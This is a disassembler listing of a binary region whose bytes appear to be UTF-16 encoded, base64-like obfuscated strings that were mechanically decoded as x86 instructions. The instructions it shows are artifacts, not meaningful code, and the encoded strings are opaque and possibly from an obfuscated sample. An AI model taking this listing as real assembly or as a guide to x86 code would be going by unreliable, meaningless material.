1000474b:	00 6d 00             	add    %ch,0x0(%ebp)
1000474e:	70 00                	jo     0x10004750
10004750:	42                   	inc    %edx
10004751:	00 61 00             	add    %ah,0x0(%ecx)
10004754:	6b 00 56             	imul   $0x56,(%eax),%eax
10004757:	00 6b 00             	add    %ch,0x0(%ebx)
1000475a:	63 00                	arpl   %eax,(%eax)
1000475c:	47                   	inc    %edi
1000475d:	00 4a 00             	add    %cl,0x0(%edx)
10004760:	4e                   	dec    %esi
10004761:	00 65 00             	add    %ah,0x0(%ebp)
10004764:	6d                   	insl   (%dx),%es:(%edi)
10004765:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
10004769:	00 56 00             	add    %dl,0x0(%esi)
1000476c:	44                   	inc    %esp
1000476d:	00 5a 00             	add    %bl,0x0(%edx)
10004770:	71 00                	jno    0x10004772
10004772:	51                   	push   %ecx
10004773:	00 57 00             	add    %dl,0x0(%edi)
10004776:	70 00                	jo     0x10004778
10004778:	46                   	inc    %esi
10004779:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
1000477d:	00 70 00             	add    %dh,0x0(%eax)
10004780:	72 00                	jb     0x10004782
10004782:	5a                   	pop    %edx
10004783:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
10004787:	00 32                	add    %dh,(%edx)
10004789:	00 61 00             	add    %ah,0x0(%ecx)
1000478c:	6b 00 46             	imul   $0x46,(%eax),%eax
1000478f:	00 71 00             	add    %dh,0x0(%ecx)
10004792:	52                   	push   %edx
10004793:	00 57 00             	add    %dl,0x0(%edi)
10004796:	31 00                	xor    %eax,(%eax)
10004798:	53                   	push   %ebx
10004799:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
1000479d:	00 31                	add    %dh,(%ecx)
1000479f:	00 36                	add    %dh,(%esi)
100047a1:	00 61 00             	add    %ah,0x0(%ecx)
100047a4:	32 00                	xor    (%eax),%al
100047a6:	5a                   	pop    %edx
100047a7:	00 55 00             	add    %dl,0x0(%ebp)
100047aa:	4e                   	dec    %esi
100047ab:	00 6d 00             	add    %ch,0x0(%ebp)
100047ae:	70 00                	jo     0x100047b0
100047b0:	42                   	inc    %edx
100047b1:	00 61 00             	add    %ah,0x0(%ecx)
100047b4:	6b 00 56             	imul   $0x56,(%eax),%eax
100047b7:	00 4e 00             	add    %cl,0x0(%esi)
100047ba:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
100047be:	74 00                	je     0x100047c0
100047c0:	6d                   	insl   (%dx),%es:(%edi)
100047c1:	00 56 00             	add    %dl,0x0(%esi)
100047c4:	44                   	inc    %esp
100047c5:	00 5a 00             	add    %bl,0x0(%edx)
100047c8:	71 00                	jno    0x100047ca
100047ca:	51                   	push   %ecx
100047cb:	00 57 00             	add    %dl,0x0(%edi)
100047ce:	70 00                	jo     0x100047d0
100047d0:	46                   	inc    %esi
100047d1:	00 5a 00             	add    %bl,0x0(%edx)
100047d4:	44                   	inc    %esp
100047d5:	00 4e 00             	add    %cl,0x0(%esi)
100047d8:	4f                   	dec    %edi
100047d9:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
100047dd:	00 70 00             	add    %dh,0x0(%eax)
100047e0:	72 00                	jb     0x100047e2
100047e2:	5a                   	pop    %edx
100047e3:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
100047e7:	00 32                	add    %dh,(%edx)
100047e9:	00 61 00             	add    %ah,0x0(%ecx)
100047ec:	6b 00 46             	imul   $0x46,(%eax),%eax
100047ef:	00 71 00             	add    %dh,0x0(%ecx)
100047f2:	52                   	push   %edx
100047f3:	00 55 00             	add    %dl,0x0(%ebp)
100047f6:	31 00                	xor    %eax,(%eax)
100047f8:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
100047fc:	32 00                	xor    (%eax),%al
100047fe:	5a                   	pop    %edx
100047ff:	00 55 00             	add    %dl,0x0(%ebp)
10004802:	4e                   	dec    %esi
10004803:	00 6d 00             	add    %ch,0x0(%ebp)
10004806:	70 00                	jo     0x10004808
10004808:	42                   	inc    %edx
10004809:	00 61 00             	add    %ah,0x0(%ecx)
1000480c:	6b 00 56             	imul   $0x56,(%eax),%eax
1000480f:	00 6a 00             	add    %ch,0x0(%edx)
10004812:	57                   	push   %edi
10004813:	00 45 00             	add    %al,0x0(%ebp)
10004816:	56                   	push   %esi
10004817:	00 4e 00             	add    %cl,0x0(%esi)
1000481a:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
1000481e:	74 00                	je     0x10004820
10004820:	6d                   	insl   (%dx),%es:(%edi)
10004821:	00 56 00             	add    %dl,0x0(%esi)
10004824:	44                   	inc    %esp
10004825:	00 5a 00             	add    %bl,0x0(%edx)
10004828:	71 00                	jno    0x1000482a
1000482a:	51                   	push   %ecx
1000482b:	00 57 00             	add    %dl,0x0(%edi)
1000482e:	70 00                	jo     0x10004830
10004830:	46                   	inc    %esi
10004831:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
10004835:	00 70 00             	add    %dh,0x0(%eax)
10004838:	72 00                	jb     0x1000483a
1000483a:	5a                   	pop    %edx
1000483b:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
1000483f:	00 32                	add    %dh,(%edx)
10004841:	00 61 00             	add    %ah,0x0(%ecx)
10004844:	6b 00 46             	imul   $0x46,(%eax),%eax
10004847:	00 71 00             	add    %dh,0x0(%ecx)
1000484a:	52                   	push   %edx
1000484b:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
1000484f:	00 77 00             	add    %dh,0x0(%edi)
10004852:	57                   	push   %edi
10004853:	00 55 00             	add    %dl,0x0(%ebp)
10004856:	31 00                	xor    %eax,(%eax)
10004858:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
1000485c:	32 00                	xor    (%eax),%al
1000485e:	5a                   	pop    %edx
1000485f:	00 55 00             	add    %dl,0x0(%ebp)
10004862:	4e                   	dec    %esi
10004863:	00 6d 00             	add    %ch,0x0(%ebp)
10004866:	70 00                	jo     0x10004868
10004868:	42                   	inc    %edx
10004869:	00 61 00             	add    %ah,0x0(%ecx)
1000486c:	6b 00 56             	imul   $0x56,(%eax),%eax
1000486f:	00 4e 00             	add    %cl,0x0(%esi)
10004872:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
10004876:	74 00                	je     0x10004878
10004878:	6d                   	insl   (%dx),%es:(%edi)
10004879:	00 56 00             	add    %dl,0x0(%esi)
1000487c:	44                   	inc    %esp
1000487d:	00 5a 00             	add    %bl,0x0(%edx)
10004880:	71 00                	jno    0x10004882
10004882:	51                   	push   %ecx
10004883:	00 57 00             	add    %dl,0x0(%edi)
10004886:	70 00                	jo     0x10004888
10004888:	46                   	inc    %esi
10004889:	00 4d 00             	add    %cl,0x0(%ebp)
1000488c:	30 00                	xor    %al,(%eax)
1000488e:	70 00                	jo     0x10004890
10004890:	32 00                	xor    (%eax),%al
10004892:	54                   	push   %esp
10004893:	00 58 00             	add    %bl,0x0(%eax)
10004896:	70 00                	jo     0x10004898
10004898:	72 00                	jb     0x1000489a
1000489a:	5a                   	pop    %edx
1000489b:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
1000489f:	00 32                	add    %dh,(%edx)
100048a1:	00 61 00             	add    %ah,0x0(%ecx)
100048a4:	6b 00 46             	imul   $0x46,(%eax),%eax
100048a7:	00 71 00             	add    %dh,0x0(%ecx)
100048aa:	52                   	push   %edx
100048ab:	00 55 00             	add    %dl,0x0(%ebp)
100048ae:	31 00                	xor    %eax,(%eax)
100048b0:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
100048b4:	32 00                	xor    (%eax),%al
100048b6:	5a                   	pop    %edx
100048b7:	00 55 00             	add    %dl,0x0(%ebp)
100048ba:	4e                   	dec    %esi
100048bb:	00 6d 00             	add    %ch,0x0(%ebp)
100048be:	70 00                	jo     0x100048c0
100048c0:	42                   	inc    %edx
100048c1:	00 61 00             	add    %ah,0x0(%ecx)
100048c4:	6b 00 56             	imul   $0x56,(%eax),%eax
100048c7:	00 6a 00             	add    %ch,0x0(%edx)
100048ca:	4d                   	dec    %ebp
100048cb:	00 6a 00             	add    %ch,0x0(%edx)
100048ce:	6c                   	insb   (%dx),%es:(%edi)
100048cf:	00 4e 00             	add    %cl,0x0(%esi)
100048d2:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
100048d6:	74 00                	je     0x100048d8
100048d8:	6d                   	insl   (%dx),%es:(%edi)
100048d9:	00 56 00             	add    %dl,0x0(%esi)
100048dc:	44                   	inc    %esp
100048dd:	00 5a 00             	add    %bl,0x0(%edx)
100048e0:	71 00                	jno    0x100048e2
100048e2:	51                   	push   %ecx
100048e3:	00 57 00             	add    %dl,0x0(%edi)
100048e6:	70 00                	jo     0x100048e8
100048e8:	46                   	inc    %esi
100048e9:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
100048ed:	00 70 00             	add    %dh,0x0(%eax)
100048f0:	72 00                	jb     0x100048f2
100048f2:	5a                   	pop    %edx
100048f3:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
100048f7:	00 32                	add    %dh,(%edx)
100048f9:	00 61 00             	add    %ah,0x0(%ecx)
100048fc:	6b 00 46             	imul   $0x46,(%eax),%eax
100048ff:	00 71 00             	add    %dh,0x0(%ecx)
10004902:	52                   	push   %edx
10004903:	00 57 00             	add    %dl,0x0(%edi)
10004906:	31 00                	xor    %eax,(%eax)
10004908:	6b 00 51             	imul   $0x51,(%eax),%eax
1000490b:	00 30                	add    %dh,(%eax)
1000490d:	00 31                	add    %dh,(%ecx)
1000490f:	00 36                	add    %dh,(%esi)
10004911:	00 61 00             	add    %ah,0x0(%ecx)
10004914:	32 00                	xor    (%eax),%al
10004916:	5a                   	pop    %edx
10004917:	00 55 00             	add    %dl,0x0(%ebp)
1000491a:	4e                   	dec    %esi
1000491b:	00 6d 00             	add    %ch,0x0(%ebp)
1000491e:	70 00                	jo     0x10004920
10004920:	42                   	inc    %edx
10004921:	00 61 00             	add    %ah,0x0(%ecx)
10004924:	6b 00 56             	imul   $0x56,(%eax),%eax
10004927:	00 4e 00             	add    %cl,0x0(%esi)
1000492a:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
1000492e:	74 00                	je     0x10004930
10004930:	6d                   	insl   (%dx),%es:(%edi)
10004931:	00 56 00             	add    %dl,0x0(%esi)
10004934:	44                   	inc    %esp
10004935:	00 5a 00             	add    %bl,0x0(%edx)
10004938:	71 00                	jno    0x1000493a
1000493a:	51                   	push   %ecx
1000493b:	00 57 00             	add    %dl,0x0(%edi)
1000493e:	70 00                	jo     0x10004940
10004940:	46                   	inc    %esi
10004941:	00 4e 00             	add    %cl,0x0(%esi)
10004944:	55                   	push   %ebp
10004945:	00 39                	add    %bh,(%ecx)
10004947:	00 53 00             	add    %dl,0x0(%ebx)
1000494a:	54                   	push   %esp
1000494b:	00 58 00             	add    %bl,0x0(%eax)
1000494e:	70 00                	jo     0x10004950
10004950:	72 00                	jb     0x10004952
10004952:	5a                   	pop    %edx
10004953:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
10004957:	00 32                	add    %dh,(%edx)
10004959:	00 61 00             	add    %ah,0x0(%ecx)
1000495c:	6b 00 46             	imul   $0x46,(%eax),%eax
1000495f:	00 71 00             	add    %dh,0x0(%ecx)
10004962:	52                   	push   %edx
10004963:	00 55 00             	add    %dl,0x0(%ebp)
10004966:	31 00                	xor    %eax,(%eax)
10004968:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
1000496c:	32 00                	xor    (%eax),%al
1000496e:	5a                   	pop    %edx
1000496f:	00 55 00             	add    %dl,0x0(%ebp)
10004972:	4e                   	dec    %esi
10004973:	00 6d 00             	add    %ch,0x0(%ebp)
10004976:	70 00                	jo     0x10004978
10004978:	42                   	inc    %edx
10004979:	00 61 00             	add    %ah,0x0(%ecx)
1000497c:	6b 00 56             	imul   $0x56,(%eax),%eax
1000497f:	00 57 00             	add    %dl,0x0(%edi)
10004982:	55                   	push   %ebp
10004983:	00 6d 00             	add    %ch,0x0(%ebp)
10004986:	4e                   	dec    %esi
10004987:	00 4e 00             	add    %cl,0x0(%esi)
1000498a:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
1000498e:	74 00                	je     0x10004990
10004990:	6d                   	insl   (%dx),%es:(%edi)
10004991:	00 56 00             	add    %dl,0x0(%esi)
10004994:	44                   	inc    %esp
10004995:	00 5a 00             	add    %bl,0x0(%edx)
10004998:	71 00                	jno    0x1000499a
1000499a:	51                   	push   %ecx
1000499b:	00 57 00             	add    %dl,0x0(%edi)
1000499e:	70 00                	jo     0x100049a0
100049a0:	46                   	inc    %esi
100049a1:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
100049a5:	00 70 00             	add    %dh,0x0(%eax)
100049a8:	72 00                	jb     0x100049aa
100049aa:	5a                   	pop    %edx
100049ab:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
100049af:	00 32                	add    %dh,(%edx)
100049b1:	00 61 00             	add    %ah,0x0(%ecx)
100049b4:	6b 00 46             	imul   $0x46,(%eax),%eax
100049b7:	00 71 00             	add    %dh,0x0(%ecx)
100049ba:	52                   	push   %edx
100049bb:	00 56 00             	add    %dl,0x0(%esi)
100049be:	68 00 46 00 57       	push   $0x57004600
100049c3:	00 6b 00             	add    %ch,0x0(%ebx)
100049c6:	31 00                	xor    %eax,(%eax)
100049c8:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
100049cc:	32 00                	xor    (%eax),%al
100049ce:	5a                   	pop    %edx
100049cf:	00 55 00             	add    %dl,0x0(%ebp)
100049d2:	4e                   	dec    %esi
100049d3:	00 6d 00             	add    %ch,0x0(%ebp)
100049d6:	70 00                	jo     0x100049d8
100049d8:	42                   	inc    %edx
100049d9:	00 61 00             	add    %ah,0x0(%ecx)
100049dc:	6b 00 56             	imul   $0x56,(%eax),%eax
100049df:	00 4e 00             	add    %cl,0x0(%esi)
100049e2:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
100049e6:	74 00                	je     0x100049e8
100049e8:	6d                   	insl   (%dx),%es:(%edi)
100049e9:	00 56 00             	add    %dl,0x0(%esi)
100049ec:	44                   	inc    %esp
100049ed:	00 5a 00             	add    %bl,0x0(%edx)
100049f0:	71 00                	jno    0x100049f2
100049f2:	51                   	push   %ecx
100049f3:	00 57 00             	add    %dl,0x0(%edi)
100049f6:	70 00                	jo     0x100049f8
100049f8:	46                   	inc    %esi
100049f9:	00 65 00             	add    %ah,0x0(%ebp)
100049fc:	56                   	push   %esi
100049fd:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
10004a01:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
10004a05:	00 70 00             	add    %dh,0x0(%eax)
10004a08:	72 00                	jb     0x10004a0a
10004a0a:	5a                   	pop    %edx
10004a0b:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
10004a0f:	00 32                	add    %dh,(%edx)
10004a11:	00 61 00             	add    %ah,0x0(%ecx)
10004a14:	6b 00 46             	imul   $0x46,(%eax),%eax
10004a17:	00 71 00             	add    %dh,0x0(%ecx)
10004a1a:	52                   	push   %edx
10004a1b:	00 55 00             	add    %dl,0x0(%ebp)
10004a1e:	31 00                	xor    %eax,(%eax)
10004a20:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
10004a24:	32 00                	xor    (%eax),%al
10004a26:	5a                   	pop    %edx
10004a27:	00 55 00             	add    %dl,0x0(%ebp)
10004a2a:	4e                   	dec    %esi
10004a2b:	00 6d 00             	add    %ch,0x0(%ebp)
10004a2e:	70 00                	jo     0x10004a30
10004a30:	42                   	inc    %edx
10004a31:	00 61 00             	add    %ah,0x0(%ecx)
10004a34:	6b 00 55             	imul   $0x55,(%eax),%eax
10004a37:	00 78 00             	add    %bh,0x0(%eax)
10004a3a:	62 00                	bound  %eax,(%eax)
10004a3c:	47                   	inc    %edi
10004a3d:	00 52 00             	add    %dl,0x0(%edx)
10004a40:	4e                   	dec    %esi
10004a41:	00 65 00             	add    %ah,0x0(%ebp)
10004a44:	6d                   	insl   (%dx),%es:(%edi)
10004a45:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
10004a49:	00 56 00             	add    %dl,0x0(%esi)
10004a4c:	44                   	inc    %esp
10004a4d:	00 5a 00             	add    %bl,0x0(%edx)
10004a50:	71 00                	jno    0x10004a52
10004a52:	51                   	push   %ecx
10004a53:	00 57 00             	add    %dl,0x0(%edi)
10004a56:	70 00                	jo     0x10004a58
10004a58:	46                   	inc    %esi
10004a59:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
10004a5d:	00 70 00             	add    %dh,0x0(%eax)
10004a60:	72 00                	jb     0x10004a62
10004a62:	5a                   	pop    %edx
10004a63:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
10004a67:	00 32                	add    %dh,(%edx)
10004a69:	00 61 00             	add    %ah,0x0(%ecx)
10004a6c:	6b 00 46             	imul   $0x46,(%eax),%eax
10004a6f:	00 71 00             	add    %dh,0x0(%ecx)
10004a72:	52                   	push   %edx
10004a73:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
10004a77:	00 35 00 65 00 55    	add    %dh,0x55006500
10004a7d:	00 31                	add    %dh,(%ecx)
10004a7f:	00 36                	add    %dh,(%esi)
10004a81:	00 61 00             	add    %ah,0x0(%ecx)
10004a84:	32 00                	xor    (%eax),%al
10004a86:	5a                   	pop    %edx
10004a87:	00 55 00             	add    %dl,0x0(%ebp)
10004a8a:	4e                   	dec    %esi
10004a8b:	00 6d 00             	add    %ch,0x0(%ebp)
10004a8e:	70 00                	jo     0x10004a90
10004a90:	42                   	inc    %edx
10004a91:	00 61 00             	add    %ah,0x0(%ecx)
10004a94:	6b 00 56             	imul   $0x56,(%eax),%eax
10004a97:	00 4e 00             	add    %cl,0x0(%esi)
10004a9a:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
10004a9e:	74 00                	je     0x10004aa0
10004aa0:	6d                   	insl   (%dx),%es:(%edi)
10004aa1:	00 56 00             	add    %dl,0x0(%esi)
10004aa4:	44                   	inc    %esp
10004aa5:	00 5a 00             	add    %bl,0x0(%edx)
10004aa8:	71 00                	jno    0x10004aaa
10004aaa:	51                   	push   %ecx
10004aab:	00 57 00             	add    %dl,0x0(%edi)
10004aae:	70 00                	jo     0x10004ab0
10004ab0:	46                   	inc    %esi
10004ab1:	00 59 00             	add    %bl,0x0(%ecx)
10004ab4:	54                   	push   %esp
10004ab5:	00 46 00             	add    %al,0x0(%esi)
10004ab8:	34 00                	xor    $0x0,%al
10004aba:	54                   	push   %esp
10004abb:	00 58 00             	add    %bl,0x0(%eax)
10004abe:	70 00                	jo     0x10004ac0
10004ac0:	72 00                	jb     0x10004ac2
10004ac2:	5a                   	pop    %edx
10004ac3:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
10004ac7:	00 32                	add    %dh,(%edx)
10004ac9:	00 61 00             	add    %ah,0x0(%ecx)
10004acc:	6b 00 46             	imul   $0x46,(%eax),%eax
10004acf:	00 71 00             	add    %dh,0x0(%ecx)
10004ad2:	52                   	push   %edx
10004ad3:	00 55 00             	add    %dl,0x0(%ebp)
10004ad6:	31 00                	xor    %eax,(%eax)
10004ad8:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
10004adc:	32 00                	xor    (%eax),%al
10004ade:	5a                   	pop    %edx
10004adf:	00 55 00             	add    %dl,0x0(%ebp)
10004ae2:	4e                   	dec    %esi
10004ae3:	00 6d 00             	add    %ch,0x0(%ebp)
10004ae6:	70 00                	jo     0x10004ae8
10004ae8:	42                   	inc    %edx
10004ae9:	00 61 00             	add    %ah,0x0(%ecx)
10004aec:	6b 00 56             	imul   $0x56,(%eax),%eax
10004aef:	00 6a 00             	add    %ch,0x0(%edx)
10004af2:	5a                   	pop    %edx
10004af3:	00 47 00             	add    %al,0x0(%edi)
10004af6:	70 00                	jo     0x10004af8
10004af8:	4e                   	dec    %esi
10004af9:	00 65 00             	add    %ah,0x0(%ebp)
10004afc:	6d                   	insl   (%dx),%es:(%edi)
10004afd:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
10004b01:	00 56 00             	add    %dl,0x0(%esi)
10004b04:	44                   	inc    %esp
10004b05:	00 5a 00             	add    %bl,0x0(%edx)
10004b08:	71 00                	jno    0x10004b0a
10004b0a:	51                   	push   %ecx
10004b0b:	00 57 00             	add    %dl,0x0(%edi)
10004b0e:	70 00                	jo     0x10004b10
10004b10:	46                   	inc    %esi
10004b11:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
10004b15:	00 70 00             	add    %dh,0x0(%eax)
10004b18:	72 00                	jb     0x10004b1a
10004b1a:	5a                   	pop    %edx
10004b1b:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
10004b1f:	00 32                	add    %dh,(%edx)
10004b21:	00 61 00             	add    %ah,0x0(%ecx)
10004b24:	6b 00 46             	imul   $0x46,(%eax),%eax
10004b27:	00 71 00             	add    %dh,0x0(%ecx)
10004b2a:	52                   	push   %edx
10004b2b:	00 56 00             	add    %dl,0x0(%esi)
10004b2e:	46                   	inc    %esi
10004b2f:	00 31                	add    %dh,(%ecx)
10004b31:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
10004b35:	00 31                	add    %dh,(%ecx)
10004b37:	00 36                	add    %dh,(%esi)
10004b39:	00 61 00             	add    %ah,0x0(%ecx)
10004b3c:	32 00                	xor    (%eax),%al
10004b3e:	5a                   	pop    %edx
10004b3f:	00 55 00             	add    %dl,0x0(%ebp)
10004b42:	4e                   	dec    %esi
10004b43:	00 6d 00             	add    %ch,0x0(%ebp)
10004b46:	70 00                	jo     0x10004b48
10004b48:	42                   	inc    %edx
10004b49:	00 61 00             	add    %ah,0x0(%ecx)
10004b4c:	6b 00 56             	imul   $0x56,(%eax),%eax
10004b4f:	00 4e 00             	add    %cl,0x0(%esi)
10004b52:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
10004b56:	74 00                	je     0x10004b58
10004b58:	6d                   	insl   (%dx),%es:(%edi)
10004b59:	00 56 00             	add    %dl,0x0(%esi)
10004b5c:	44                   	inc    %esp
10004b5d:	00 5a 00             	add    %bl,0x0(%edx)
10004b60:	71 00                	jno    0x10004b62
10004b62:	51                   	push   %ecx
10004b63:	00 57 00             	add    %dl,0x0(%edi)
10004b66:	70 00                	jo     0x10004b68
10004b68:	46                   	inc    %esi
10004b69:	00 51 00             	add    %dl,0x0(%ecx)
10004b6c:	7a 00                	jp     0x10004b6e
10004b6e:	52                   	push   %edx
10004b6f:	00 36                	add    %dh,(%esi)
10004b71:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
10004b75:	00 70 00             	add    %dh,0x0(%eax)
10004b78:	72 00                	jb     0x10004b7a
10004b7a:	5a                   	pop    %edx
10004b7b:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
10004b7f:	00 32                	add    %dh,(%edx)
10004b81:	00 61 00             	add    %ah,0x0(%ecx)
10004b84:	6b 00 46             	imul   $0x46,(%eax),%eax
10004b87:	00 71 00             	add    %dh,0x0(%ecx)
10004b8a:	52                   	push   %edx
10004b8b:	00 55 00             	add    %dl,0x0(%ebp)
10004b8e:	31 00                	xor    %eax,(%eax)
10004b90:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
10004b94:	32 00                	xor    (%eax),%al
10004b96:	5a                   	pop    %edx
10004b97:	00 55 00             	add    %dl,0x0(%ebp)
10004b9a:	4e                   	dec    %esi
10004b9b:	00 6d 00             	add    %ch,0x0(%ebp)
10004b9e:	70 00                	jo     0x10004ba0
10004ba0:	42                   	inc    %edx
10004ba1:	00 61 00             	add    %ah,0x0(%ecx)
10004ba4:	6b 00 56             	imul   $0x56,(%eax),%eax
10004ba7:	00 4e 00             	add    %cl,0x0(%esi)
10004baa:	52                   	push   %edx
10004bab:	00 45 00             	add    %al,0x0(%ebp)
10004bae:	31 00                	xor    %eax,(%eax)
10004bb0:	4e                   	dec    %esi
10004bb1:	00 65 00             	add    %ah,0x0(%ebp)
10004bb4:	6d                   	insl   (%dx),%es:(%edi)
10004bb5:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
10004bb9:	00 56 00             	add    %dl,0x0(%esi)
10004bbc:	44                   	inc    %esp
10004bbd:	00 5a 00             	add    %bl,0x0(%edx)
10004bc0:	71 00                	jno    0x10004bc2
10004bc2:	51                   	push   %ecx
10004bc3:	00 57 00             	add    %dl,0x0(%edi)
10004bc6:	70 00                	jo     0x10004bc8
10004bc8:	46                   	inc    %esi
10004bc9:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
10004bcd:	00 70 00             	add    %dh,0x0(%eax)
10004bd0:	72 00                	jb     0x10004bd2
10004bd2:	5a                   	pop    %edx
10004bd3:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
10004bd7:	00 32                	add    %dh,(%edx)
10004bd9:	00 61 00             	add    %ah,0x0(%ecx)
10004bdc:	6b 00 46             	imul   $0x46,(%eax),%eax
10004bdf:	00 71 00             	add    %dh,0x0(%ecx)
10004be2:	52                   	push   %edx
10004be3:	00 58 00             	add    %bl,0x0(%eax)
10004be6:	68 00 50 00 56       	push   $0x56005000
10004beb:	00 6b 00             	add    %ch,0x0(%ebx)
10004bee:	31 00                	xor    %eax,(%eax)
10004bf0:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
10004bf4:	32 00                	xor    (%eax),%al
10004bf6:	5a                   	pop    %edx
10004bf7:	00 55 00             	add    %dl,0x0(%ebp)
10004bfa:	4e                   	dec    %esi
10004bfb:	00 6d 00             	add    %ch,0x0(%ebp)
10004bfe:	70 00                	jo     0x10004c00
10004c00:	42                   	inc    %edx
10004c01:	00 61 00             	add    %ah,0x0(%ecx)
10004c04:	6b 00 56             	imul   $0x56,(%eax),%eax
10004c07:	00 4e 00             	add    %cl,0x0(%esi)
10004c0a:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
10004c0e:	74 00                	je     0x10004c10
10004c10:	6d                   	insl   (%dx),%es:(%edi)
10004c11:	00 56 00             	add    %dl,0x0(%esi)
10004c14:	44                   	inc    %esp
10004c15:	00 5a 00             	add    %bl,0x0(%edx)
10004c18:	71 00                	jno    0x10004c1a
10004c1a:	51                   	push   %ecx
10004c1b:	00 57 00             	add    %dl,0x0(%edi)
10004c1e:	70 00                	jo     0x10004c20
10004c20:	46                   	inc    %esi
10004c21:	00 65 00             	add    %ah,0x0(%ebp)
10004c24:	47                   	inc    %edi
10004c25:	00 4e 00             	add    %cl,0x0(%esi)
10004c28:	4e                   	dec    %esi
10004c29:	00 65 00             	add    %ah,0x0(%ebp)
10004c2c:	6d                   	insl   (%dx),%es:(%edi)
10004c2d:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
10004c31:	00 56 00             	add    %dl,0x0(%esi)
10004c34:	44                   	inc    %esp
10004c35:	00 5a 00             	add    %bl,0x0(%edx)
10004c38:	71 00                	jno    0x10004c3a
10004c3a:	51                   	push   %ecx
10004c3b:	00 57 00             	add    %dl,0x0(%edi)
10004c3e:	70 00                	jo     0x10004c40
10004c40:	46                   	inc    %esi
10004c41:	00 00                	add    %al,(%eax)
10004c43:	15 4d 00 7a 00       	adc    $0x7a004d,%eax
10004c48:	6b 00 66             	imul   $0x66,(%eax),%eax
10004c4b:	00 54 00 36          	add    %dl,0x36(%eax,%eax,1)
10004c4f:	00 6a 00             	add    %ch,0x0(%edx)
10004c52:	41                   	inc    %ecx
10004c53:	00 6a 00             	add    %ch,0x0(%edx)
10004c56:	45                   	inc    %ebp
10004c57:	00 00                	add    %al,(%eax)
10004c59:	80 b9 64 00 46 00 41 	cmpb   $0x41,0x460064(%ecx)
10004c60:	00 32                	add    %dh,(%edx)
10004c62:	00 65 00             	add    %ah,0x0(%ebp)
10004c65:	57                   	push   %edi
10004c66:	00 64 00 49          	add    %ah,0x49(%eax,%eax,1)
10004c6a:	00 65 00             	add    %ah,0x0(%ebp)
10004c6d:	47                   	inc    %edi
10004c6e:	00 46 00             	add    %al,0x0(%esi)
10004c71:	79 00                	jns    0x10004c73
10004c73:	52                   	push   %edx
10004c74:	00 45 00             	add    %al,0x0(%ebp)
10004c77:	74 00                	je     0x10004c79
10004c79:	70 00                	jo     0x10004c7b
10004c7b:	4e                   	dec    %esi
10004c7c:	00 58 00             	add    %bl,0x0(%eax)
10004c7f:	52                   	push   %edx
10004c80:	00 51 00             	add    %dl,0x0(%ecx)
10004c83:	4e                   	dec    %esi
10004c84:	00 6e 00             	add    %ch,0x0(%esi)
10004c87:	6c                   	insb   (%dx),%es:(%edi)
10004c88:	00 6e 00             	add    %ch,0x0(%esi)
10004c8b:	53                   	push   %ebx
10004c8c:	00 48 00             	add    %cl,0x0(%eax)
10004c8f:	68 00 68 00 63       	push   $0x63006800
10004c94:	00 6b 00             	add    %ch,0x0(%ebx)
10004c97:	52                   	push   %edx
10004c98:	00 30                	add    %dh,(%eax)
10004c9a:	00 55 00             	add    %dl,0x0(%ebp)
10004c9d:	44                   	inc    %esp
10004c9e:	00 5a 00             	add    %bl,0x0(%edx)
10004ca1:	35 00 5a 00 30       	xor    $0x30005a00,%eax
10004ca6:	00 68 00             	add    %ch,0x0(%eax)
10004ca9:	34 00                	xor    $0x0,%al
10004cab:	59                   	pop    %ecx
10004cac:	00 58 00             	add    %bl,0x0(%eax)
10004caf:	4a                   	dec    %edx
10004cb0:	00 45 00             	add    %al,0x0(%ebp)
10004cb3:	62 00                	bound  %eax,(%eax)
10004cb5:	47                   	inc    %edi
10004cb6:	00 56 00             	add    %dl,0x0(%esi)
